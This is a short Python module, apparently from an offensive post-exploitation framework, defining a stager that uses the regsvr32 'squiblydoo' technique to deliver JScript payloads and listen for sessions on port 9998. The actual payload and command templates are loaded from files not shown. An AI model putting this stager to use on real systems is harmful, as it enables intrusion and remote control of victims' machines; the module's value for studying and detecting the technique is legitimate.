import core.stager

class MSHTAStager(core.stager.Stager):

    NAME = "JScript RegSvr Stager"
    DESCRIPTION = "Listens for new sessions, using REGSVR32 for payloads (AKA squiblydoo)"
    AUTHORS = [ 'subTee', # discovery
                'zerosum0x0' # stager
                ]

    WORKLOAD = "js"

    def load(self):
        #self.options.set("SRVPORT", 9998)
        self.port = 9998

        self.template = self.loader.load_script("data/stager/js/regsvr/template.sct")
        self.stagecmd = self.loader.load_script("data/stager/js/regsvr/regsvr.cmd")
        self.forkcmd = self.loader.load_script("data/stager/js/regsvr/regsvr.cmd")
